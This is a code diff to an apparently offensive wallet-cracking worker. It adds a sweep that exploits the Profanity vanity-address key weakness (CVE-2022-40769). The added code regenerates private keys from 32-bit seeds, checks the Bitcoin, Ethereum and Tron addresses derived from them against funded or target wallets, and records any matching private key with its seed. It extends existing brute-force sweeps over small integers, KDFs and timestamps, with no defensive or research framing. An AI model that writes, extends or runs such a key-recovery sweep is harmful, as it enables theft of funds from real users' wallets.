@@ -166,6 +166,17 @@ const sweepRangeEnd = process.env.RWS_SWEEP_END ? Number(process.env.RWS_SWEEP_E
 if (process.env.RWS_SWEEP_START && smallIntNext < sweepRangeStart) {
   smallIntNext = sweepRangeStart + workerId;
 }
+// Profanity vanity-generator finite family (CVE-2022-40769): seed w owns
+// seeds n ≡ w (mod workerCount). Each seed expands to lanes × depth keys on
+// the GPU grid d0 + w·2^192 + t (see crypto_engine.profanityKeys).
+let profanitySeedNext = (Number(workerData && workerData.profanityCursor) || 0) + workerId;
+const profanitySeedStep = workerCount;
+const profanitySeedStart = Number(process.env.RWS_PROFANITY_SEED_START || 0);
+const profanitySeedEnd = process.env.RWS_PROFANITY_SEED_END ? Number(process.env.RWS_PROFANITY_SEED_END) : 4294967296;
+const profanityLanes = Math.min(64, Math.max(1, Number(process.env.RWS_PROFANITY_LANES || 1)));
+const profanityDepth = Math.min(256, Math.max(1, Number(process.env.RWS_PROFANITY_DEPTH || 4)));
+const profanitySeedsPerBurst = Math.max(1, Number(process.env.RWS_PROFANITY_BATCH || 3));
+if (profanitySeedNext < profanitySeedStart) profanitySeedNext = profanitySeedStart + workerId;
 
 if (parentPort) {
   parentPort.on('message', msg => {
@@ -283,6 +294,55 @@ function runSmallIntSweep(count = 24) {
         smallIntKeyNumber: n,
         ...fullAddrs
       });
+    }
+  }
+  return { checked, hits };
+}
+
+/**
+ * Finite Family: Profanity vanity-address generator keys (CVE-2022-40769).
+ * johguse/profanity derived each 256-bit key from a 32-bit seed via
+ * mt19937_64 (4×64-bit words, first output = least significant word), then
+ * walked key + w·2^192 + R per GPU lane until the address matched the vanity
+ * pattern — and PRINTED that key. Real users' wallets therefore live on a
+ * countable grid (Amber Group reconstruction: key = d0(seed) + (1<<192)*w + R),
+ * so the same bloom-screen + verify pipeline applies. Partitioned across
+ * workers exactly like the small-int sweep; the server persists the frontier.
+ */
+function runProfanitySweep(seeds = 3) {
+  const hits = [];
+  let checked = 0;
+  for (let i = 0; i < seeds; i++) {
+    const seed = profanitySeedNext;
+    if (seed >= profanitySeedEnd) break;
+    profanitySeedNext += profanitySeedStep;
+    for (const keyInt of eng.profanityKeys(seed, profanityLanes, profanityDepth)) {
+      const privHex = keyInt.toString(16).padStart(64, '0');
+      const privKey = Buffer.from(privHex, 'hex');
+      if (!tryClaimUniqueCandidate(privHex, 'pk:')) continue;
+      const fast = eng.deriveUltraFastScreener(privKey);
+      checked++;
+      if (
+        isTargetOrFundedHit(fast.btcLegacy) ||
+        isTargetOrFundedHit(fast.btcLegacyUncompressed) ||
+        isTargetOrFundedHit(fast.btcNestedSegwit) ||
+        isTargetOrFundedHit(fast.btcSegwit) ||
+        isTargetOrFundedHit(fast.ethAddressLower) ||
+        isTargetOrFundedHit(fast.trxAddress)
+      ) {
+        const fullAddrs = eng.deriveAddressesFromPrivKey(privKey, true);
+        hits.push({
+          source: `Worker #${workerId + 1} • Profanity Seed #${seed}`,
+          vectorKey: 'profanity',
+          feedType: 'Private',
+          phraseType: `Profanity Seed ${seed}`,
+          input: `0x${privHex}`,
+          brainArm: 'ProfanitySeedSweep',
+          priorityHit: true,
+          profanitySeed: seed,
+          ...fullAddrs
+        });
+      }
     }
   }
   return { checked, hits };
@@ -660,11 +720,13 @@ function workerLoop() {
     const { screenedWallets, burstHits } = runUltraFastHardwareBurst(32);
     const smallInt = runSmallIntSweep(24);
     if (smallInt.hits.length) burstHits.push(...smallInt.hits);
+    const prof = runProfanitySweep(profanitySeedsPerBurst);
+    if (prof.hits.length) burstHits.push(...prof.hits);
     const kdf = runKdfFamilySweep(localCounter);
     if (kdf.hits.length) burstHits.push(...kdf.hits);
     const tsSweep = runTimestampSweep(12);
     if (tsSweep.hits.length) burstHits.push(...tsSweep.hits);
-    const screenedTotal = screenedWallets + smallInt.checked + kdf.checked + tsSweep.checked;
+    const screenedTotal = screenedWallets + smallInt.checked + prof.checked + kdf.checked + tsSweep.checked;
 
     const batch = [];
     let attempts = 0;
@@ -691,7 +753,9 @@ function workerLoop() {
         scannedCount: screenedTotal + batch.length,
         addressesChecked: (screenedTotal * 5) + (batch.length * 14),
         smallIntNext,
-        smallIntChecked: smallInt.checked
+        smallIntChecked: smallInt.checked,
+        profanitySeedNext,
+        profanityChecked: prof.checked
       });
     }
     }
